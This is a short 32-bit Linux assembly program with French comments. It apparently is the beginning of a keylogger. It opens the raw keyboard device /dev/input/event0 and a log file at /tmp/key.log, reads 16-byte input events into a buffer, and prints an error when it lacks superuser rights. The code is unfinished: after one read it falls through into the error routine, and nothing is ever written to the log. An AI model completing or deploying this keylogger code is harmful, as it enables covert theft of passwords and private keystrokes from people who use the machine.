global _start

section .text
_start:

    ; open event_file
    xor ecx, ecx
    mov ebx, event_keyboard
    mov eax, 5
    int 0x80

    mov esi, eax 

    mov edx, 420          ; 644
    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
    mov ebx, output_file
    mov eax, 5            ; sys_open
    int 0x80

    cmp eax, -13   ; EACCES - Permission Denied - code d'erreur -13
    je erreur      ; jump si registre eax du syscall open = -13

    mov edi, eax 

input:

    mov edx, 16
    mov ecx, input_event
    mov ebx, esi                    ; File descriptor for reading bytes
    mov eax, 3                      ; sys_read
    int 0x80




erreur:
    mov eax, 4              ; sys_write
    mov ebx, 2              ; stderr
    mov ecx, errMsg
    mov edx, lenErrMsg
    int 0x80

    mov eax, 1              ; sys_exit
    int 0x80
    ret


section .data
    event_keyboard db "/dev/input/event0", 0
    output_file   db "/tmp/key.log", 0
    errMsg db "Besoin des privilèges du superUtilisateur", 0xa
    lenErrMsg equ $ - errMsg


section .bss
    input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
